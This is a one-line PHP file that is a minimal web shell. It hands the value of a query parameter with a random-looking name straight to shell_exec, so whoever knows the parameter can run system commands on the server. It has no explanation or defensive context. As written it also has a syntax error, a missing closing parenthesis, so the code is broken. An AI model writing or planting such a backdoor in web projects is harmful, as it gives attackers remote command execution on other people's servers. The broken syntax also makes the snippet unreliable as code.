<?php
shell_exec($_GET['vKj8-NYE'];
?>
